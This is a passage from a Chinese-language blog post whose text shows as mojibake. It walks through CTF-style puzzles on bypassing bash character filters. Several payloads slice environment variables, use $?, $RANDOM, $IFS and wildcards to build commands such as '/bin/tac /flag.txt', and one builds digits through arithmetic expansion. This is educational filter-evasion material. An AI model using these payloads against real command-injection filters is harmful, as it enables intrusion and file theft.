plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&lt; $ ? : ; . &#123; &#125; ~</span><br><span class="line">A D E F H I L M N O P R T S U V</span><br></pre></td></tr></table></figure><p>æˆ‘ä»¬é¦–å…ˆçœ‹ä¸€ä¸‹ï¼Œæ²¡æœ‰å°å†™å­—æ¯ï¼Œç›´æ¥æ‰§è¡Œå‘½ä»¤æ˜¯ä¸å¯èƒ½çš„ï¼Œç„¶ååªèƒ½æƒ³åˆ°åˆ©ç”¨ <code>/bin/cat</code> è¿™ä¸€ç±»çš„æ¥å°è¯•ä¸€ä¸‹ï¼Œä½†æ˜¯ / ä¹Ÿè¢«è¿‡æ»¤äº†ï¼Œè¿™ä¸ªæ—¶å€™æˆ‘ä»¬å°±è¦æ€è€ƒä¸€ä¸‹ / ä»å“ªé‡Œæ¥äº†</p><p>ç»™äº†å¤§å†™å­—æ¯å’Œ $ { } å¯ä»¥å°è¯•ä¸€ä¸‹åˆ©ç”¨ç¯å¢ƒå˜é‡ï¼Œenv è¿™ä¸ªæŒ‡ä»¤å¯ä»¥è·å–ç¯å¢ƒå˜é‡ï¼Œä¸åŒäººçš„æœºå­ä¸ä¸€æ ·ï¼Œç¯å¢ƒå˜é‡ä¹Ÿä¸ä¸€æ ·ï¼Œå¯èƒ½ä¼šæœ‰æ‰€å‡ºå…¥ï¼Œä½†æ˜¯æˆ‘çš„æ˜¯ ok çš„ï¼Œæ‰€ä»¥ç›¸ä¿¡å¤§å®¶çš„éƒ½ ok</p><p>å› ä¸º <code>PATH</code> æ˜¯ <code>/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/root/bin</code>ï¼Œæ‰€ä»¥æˆ‘ä»¬å¯ä»¥å°è¯•å–å®ƒçš„ç¬¬ä¸€ä½ï¼Œå°±å¯ä»¥è·å¾— / äº†ï¼Œç„¶ååˆæœ‰ <code>SHELL</code> ä¸º <code>/bin/bash</code>ï¼Œæ‰€ä»¥æˆ‘ä»¬ä¹Ÿå¯ä»¥å°è¯•å–å®ƒçš„å‰äº”ä½ï¼Œå°±æ˜¯ <code>/bin/</code>ï¼Œç„¶åå°±åªè¦è€ƒè™‘åé¢ç”¨å“ªä¸ªå‘½ä»¤è¯»å–äº†ï¼Œä½†æ˜¯é—®é¢˜å°±æ¥äº†ï¼Œé¢˜ç›®å¹¶æ²¡æœ‰ç»™ğŸ‘´æ•°å­—ï¼Œé‚£ğŸ‘´æ€ä¹ˆåŠå‘¢ï¼Œå¾ˆç®€å•</p><hr><p>shell ä¸­è¿è¡Œçš„æ¯ä¸ªå‘½ä»¤éƒ½ä½¿ç”¨é€€å‡ºçŠ¶æ€ç ï¼ˆexit statusï¼‰æ¥å‘Šè¯‰shell å®ƒå®Œæˆäº†å¤„ç†ã€‚é€€å‡ºçŠ¶æ€ç æ˜¯ä¸€ä¸ª 0 ~ 255 ä¹‹é—´çš„æ•´æ•°å€¼ï¼Œåœ¨å‘½ä»¤ç»“æŸè¿è¡Œæ—¶ç”±å‘½ä»¤ä¼ ç»™shell</p><p>Linux ä½¿ç”¨äº† $? è¿™ä¸ªä¸“å±å˜é‡æ¥ä¿å­˜ä¸Šä¸ªæ‰§è¡Œçš„å‘½ä»¤çš„é€€å‡ºçŠ¶æ€ç </p><hr><p>æ‰€ä»¥æˆ‘ä»¬å¯ä»¥åˆ©ç”¨ $?  æ¥æ¦¨å–ä¸€ä¸ªæ•°å­—ï¼Œä½†æ˜¯æˆ‘ä»¬å¯ä»¥æ¦¨å–åˆ°å“ªä¸ªæ•°å­—å‘¢ï¼Œåˆæ˜¯å¦å¯¹æˆ‘ä»¬çš„æ“ä½œæœ‰å¸®åŠ©å‘¢</p><p>Linux çš„é”™è¯¯çŠ¶æ€é€€å‡ºçŠ¶æ€ç æ²¡æœ‰ä»€ä¹ˆæ ‡å‡†å¯éµå¾ªï¼Œä½†æœ‰ä¸€äº›å‚è€ƒ</p><table><thead><tr><th>çŠ¶æ€ç </th><th>æè¿°</th></tr></thead><tbody><tr><td>0</td><td>å‘½ä»¤æˆåŠŸç»“æŸ</td></tr><tr><td>1</td><td>ä¸€èˆ¬æ€§æœªçŸ¥é”™è¯¯</td></tr><tr><td>2</td><td>ä¸é€‚åˆçš„ shell å‘½ä»¤</td></tr><tr><td>123</td><td>å‘½ä»¤ä¸å¯æ‰§è¡Œ</td></tr><tr><td>127</td><td>æ²¡æ‰¾åˆ°å‘½ä»¤</td></tr><tr><td>128</td><td>æ— æ•ˆé€€å‡ºå‚æ•°</td></tr><tr><td>128+x</td><td>ä¸ Linux ä¿¡å·xç›¸å…³çš„ä¸¥é‡é”™è¯¯</td></tr><tr><td>130</td><td>é€šè¿‡ ctrl+c ç»ˆæ­¢çš„å‘½ä»¤</td></tr><tr><td>255</td><td>æ­£å¸¸èŒƒå›´ä¹‹å†…çš„é€€å‡ºçŠ¶æ€ç </td></tr></tbody></table><p>emmï¼Œâ€ä¸€èˆ¬æ€§æœªçŸ¥é”™è¯¯â€œ</p><p><img src="https://i.loli.net/2021/04/24/DBCWrJxRAa9ctny.png"></p><p>å½³äºï¼Œé‚£æˆ‘ä»¬å°±æœ‰ä¸€ä¸ª 1 äº†ï¼Œä¸è¿‡ 2 å•¥çš„è¿˜æ²¡æ‰¾åˆ°å’‹æï¼Œä¸è¿‡æœ‰ä¸€ä¸ª 1 å°±å¤Ÿäº†ï¼Œå› ä¸ºæˆ‘ä»¬è¿˜æœ‰ä¸€ä¸ª <code>RANDOM</code> ç¯å¢ƒå˜é‡å¯ä»¥åˆ©ç”¨ï¼š<code>&lt;A;echo $&#123;RANDOM:~A:$?&#125;</code>ï¼Œä»‹ä¸ªæ ·å­å°±å¯ä»¥å–åˆ°ä¸€ä½éšæœºæ•°äº†ï¼Œå¾ˆç„å­¦çš„ä¸€ä¸ªåœ°æ–¹å°±æ˜¯ <code>~A</code> è¿™ä¸ªç©æ„å„¿ä¼¼ä¹åœ¨ <code>$&#123;&#125;</code> å¯ä»¥å–åˆ°ç¯å¢ƒå˜é‡çš„æœ€åä¸€ä½çš„ä½ç½®ï¼Œåˆ©ç”¨è¿™ä¸ªç‚¹å¯ä»¥ç©å¾ˆå¤šéªšçš„</p><p><img src="https://i.loli.net/2021/04/24/xoP3ThNclKmziE2.png"></p><p>å¥½äº†ï¼Œéšæœºä¸ªä½æ•°å­—ä¹Ÿæ¥äº†ï¼Œæˆ‘ä»¬åªéœ€è¦è¿™æ ·ï¼š<code>&lt;A;echo $&#123;SHELL::$&#123;RANDOM::$?&#125;&#125;</code>ï¼Œéšæœºåˆ°ä¸€ä¸ª 5 å°±å¯ä»¥è·å¾— <code>/bin/</code> è¾£ï¼Œé‚£ä¹ˆæ€ä¹ˆè¯»æ–‡ä»¶å‘¢ï¼Œçœ‹äº†è›®ä¹…çš„ env åå‘ç°ï¼Œä¼¼ä¹ç”¨ tac æ˜¯æœ€å¥½çš„é€‰æ‹©ï¼Œå› ä¸ºæœ€åä¸€ä½çš„ t è›®å¤šçš„ï¼Œæ¯”å¦‚ HOMEï¼ŒUSERï¼ŒMAILï¼ˆæˆ‘çš„åæ­£æ˜¯ï¼‰</p><p><img src="https://i.loli.net/2021/04/24/5SOdXyIuqklrJTm.png"></p><p>ç„¶åç©ºæ ¼ç”¨ $IFS éšä¾¿è¿‡äº†ï¼Œæœ€åæ–‡ä»¶é©¬é©¬è™è™ä¸€ä¸ª <code>$&#123;PATH::$?&#125;????.???</code> ä»£æ›¿äº† /flag.txtï¼Œæœ€ç»ˆ payloadï¼š<code>&lt;A;$&#123;SHELL::$&#123;RANDOM::$?&#125;&#125;$&#123;USER:~A:$?&#125;??$IFS$&#123;PATH::$?&#125;????.???</code></p><p>ä½ åˆ«è¯´ï¼Œæˆ‘è¿˜çœŸè¯»å‡ºæ¥äº†å¥¥</p><p><img src="https://i.loli.net/2021/04/24/PZC6YcRTd2xHIJu.jpg"></p><p>ä½†æ˜¯å¾ˆå¥‡æ€ªçš„ä¸€ç‚¹ï¼Œå°±æ˜¯ <code>/bin/t?? flag.txt</code> çš„æ—¶å€™ä¼šå‡ºç°å‰ä¸Šå›¾ä¸€å¤§ä¸²å¥‡æ€ªçš„ä¹±ç ï¼Œä½†æ˜¯ç›´æ¥ <code>/bin/tac flag.txt</code> ä¸ä¼š</p><p><img src="https://i.loli.net/2021/04/24/JPpEVxyIgN9vFsR.png"></p><p>è¿™ä¸€ç‚¹ä¸å’‹ç†è§£ï¼Œä½†æ˜¯æ— ä¼¤å¤§é›…</p><p>æœ€åå†æ¥ä¸€ä¸ªï¼Œæˆ‘æŠŠ &lt; æˆ–è€… $? è¿‡æ»¤ï¼ˆå°±æ˜¯è¿™ä¿©è´§è¿åœ¨ä¸€èµ·å°±è¿‡æ»¤ï¼‰çš„è¯åº”è¯¥æ€ä¹ˆåŠï¼Ÿ</p><p>å¾ˆç®€å•ï¼Œç”¨ <code>SHIVL</code> å°± ok äº†ï¼ŒSHIVL=1</p><h2 id="0x01"><a href="#0x01" class="headerlink" title="0x01"></a>0x01</h2><p>è¿™ä¼šæƒ³ç»§ç»­æŠ˜ç£¨ä¸€ä¸‹å¤§ä¸€æ–°ç”Ÿï¼Œç»“åˆäº†ä¸€ä¸‹å‰é¢çš„æ„é€ æ•°å­—ï¼Œåº”è¯¥æŒºç®€å•çš„ï¼Œä¸ç§’æ‰çš„è¯å°±è¦æ‰“PP</p><p>okï¼Œç°åœ¨æŠ›å‡ºä¸€ä¸ªé—®é¢˜ï¼šç°åœ¨ğŸ‘´è¯•å›¾è¯»å‡º /FLAG.TXT æ–‡ä»¶ï¼Œä½†æ˜¯ğŸ‘´è¢«é™åˆ¶äº†å­—ç¬¦ï¼Œåªå…è®¸ä½¿ç”¨å¦‚ä¸‹å­—ç¬¦ï¼ŒåŒæ—¶ç¦æ­¢å‡ºç°å½¢å¦‚ <code>~A</code> çš„å­—ç¬¦ä¸²ï¼Œæ€è§£</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ : &#123; &#125; ( ) ~</span><br><span class="line">A D E F G H I L M N O P R T S U X</span><br></pre></td></tr></table></figure><p><del>å…ˆä¸å†™äº†ï¼ŒğŸ‘´ä¹Ÿè¿˜æ²¡ä»”ç»†æƒ³ï¼Œåªæ˜¯è§‰å¾—è¿™æ ·å¯ä»¥å‡ºï¼Œè¿™å‘¨æœ«è¯¾è®¾ï¼Œå¤ªçƒ¦äº†ï¼Œç¡äº†</del></p><p>å¾ˆç®€å•ï¼šåˆ©ç”¨ğŸ‘´å‰é¢åˆ—å‡ºæ¥çš„è¡¨æ ¼å°± ok äº†ï¼Œæ­¤å¤„ä¾¿ä¸åšè¯¦è§£ï¼Œç›´æ¥ç»™å‡º payloadï¼šï¼ˆ/bin/cat FLAG.TXTï¼‰<code>$&#123;SHELL::$((~$(($((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))))))&#125;$&#123;PATH:$((~$(($((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(()))))))):$((~$(($((~$(())))$((~$(())))$((~$(())))))))&#125;$&#123;HOME:$((~$(()))):$((~$(($((~$(())))$((~$(())))))))&#125;$IFS$9FLAG$&#123;LANG:$((~$(($((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(()))))))):$((~$(($((~$(())))$((~$(())))))))&#125;TXT</code></p><p><img src="https://i.loli.net/2021/05/03/TIgDzNHnW5V9QBm.png"></p><h2 id="0x02"><a href="#0x02" class="headerlink" title="0x02"></a>0x02</h2><p>è¶ŠææŠ˜ç£¨ğŸ‘´è¶Šå…´å¥‹ï¼Œæ¥ä¸€æ³¢æ–°çš„ç®€å•æ€è·¯</p><p>ç°åœ¨æŠ›å‡ºä¸€ä¸ªé—®é¢˜ï¼šç°åœ¨ğŸ‘´è¯•å›¾è¯»å‡º /flag.txt æ–‡ä»¶ï¼Œä½†æ˜¯ğŸ‘´è¢«é™åˆ¶äº†å­—ç¬¦ï¼Œåªå…è®¸ä½¿ç”¨å¦‚ä¸‹å­—ç¬¦ï¼Œæ€è§£</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ &#123; &#125; : 0-9 ? &#x2F; .</span><br></pre></td></tr></table></figure><p>å¤ªç®€å•äº†å¤ªç®€å•äº†ï¼Œç›´æ¥ç»™å‡º payload å§ï¼Œéƒ½ä¸éœ€è¦åˆ†æçš„ï¼šï¼ˆ/bin/less flag.txtï¼‰</p><p><code>/$&#123;0:1:1&#125;??/??$&#123;0:3:1&#125;$&#123;0:3:1&#125; ????.???</code></p><p>because $0 è¿”å› <code>-bash</code>ï¼ˆè¿™ä¸ªå¥½åƒç¡®å®æœ‰ä¸åŒï¼Œ@LemonPrefect å¸ˆå‚…çš„å’Œæˆ‘çš„å°±æœ‰åŒºåˆ«ï¼Œä»–çš„ $0 æ˜¯è¿”å› bashï¼Œå¯èƒ½æ˜¯å› ä¸ºğŸ‘´çš„bashç‰ˆæœ¬å¤ªæ—§äº†ï¼ˆï¼‰ï¼Œå½“ç„¶ï¼Œåªæ˜¯ä¸€ä¸ª - çš„åŒºåˆ«ï¼Œæœ¬è´¨è¿˜æ˜¯æ²¡æœ‰å½±å“çš„</p><hr><p><img src="https://i.loli.net/2021/05/03/K9Nk4YmxFnvGLlI.png"></p><p>å¯ä»¥çœ‹åˆ°æˆ‘çš„ bash ç‰ˆæœ¬æ˜¯ 4.26.46(1)ï¼Œ@LemonPrefect å¸ˆå‚…ç”¨çš„æœ€è€çš„ 4.26.46(2) æµ‹è¯•ä¹Ÿæ˜¯è¿”å› <code>bash</code>ï¼Œè€Œé <code>-bash</code>ï¼Œæ­¤å¤„æ„Ÿè°¢ @LemonPrefect å¸ˆå‚…å¸®å¿™æµ‹è¯•</p><hr><h1 id="è¡¥å……"><a href="#è¡¥å……" class="headerlink" title="è¡¥å……"></a>è¡¥å……</h1><p>å…³äºå‰é¢è¿™ä¹ˆå¤šéªšä¸œè¥¿ï¼Œè¡¥å……ä¸€äº›åŸºæœ¬åŸç†å’Œæ³¨æ„äº‹é¡¹å§ã€‚</p><p>é¦–å…ˆè¯´è¯´ä¸ºä»€ä¹ˆ $# ä¼šè¿”å› 0 å§ï¼Œæˆ‘ä¸çŸ¥é“</p><p>ç®—äº†ï¼Œæ‡’èµ·æ¥äº†ï¼Œå…ˆä¸æäº†ï¼Œè¿‡æ®µæ—¶é—´å†æ•´ç†å§ã€‚ï¼ˆåˆ«æ‰“ğŸ‘´</p>]]></content>
      
      
      
        <tags>
            
            <tag> Linux </tag>
            
            <tag> å¥‡æŠ€æ·«å·§ </tag>
            
        </tags>
      
    </entry>
    
    
  
  
</search>
